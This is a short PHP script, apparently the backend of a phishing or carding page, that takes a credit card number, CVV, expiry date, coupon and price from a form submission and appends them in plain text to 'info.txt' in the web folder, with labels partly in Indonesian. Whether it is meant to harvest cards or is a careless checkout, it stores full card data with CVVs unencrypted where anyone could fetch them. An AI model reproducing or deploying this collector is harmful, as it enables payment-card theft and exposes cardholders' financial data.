<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $card_number = $_POST['card-number'];
    $CVV = $_POST['cvv'];
    $date = $_POST['date'];
    $coupon = $_POST['coupon'];
    $last = $_POST['last'];

    // Format data that will be written to the text file
    $data = "No Kartu Kredit: $card_number\nCVV: $CVV\nExpiry Date: $date\nKupon: $coupon\nharga: $last\n\n";

    // Name and path of the text file
    $file = 'info.txt';

    // Write data to the text file (mode 'a' to append data)
    file_put_contents($file, $data, FILE_APPEND);

    echo 'Data has been successfully saved.';
} else {
    echo 'Invalid request method.';
}
?>
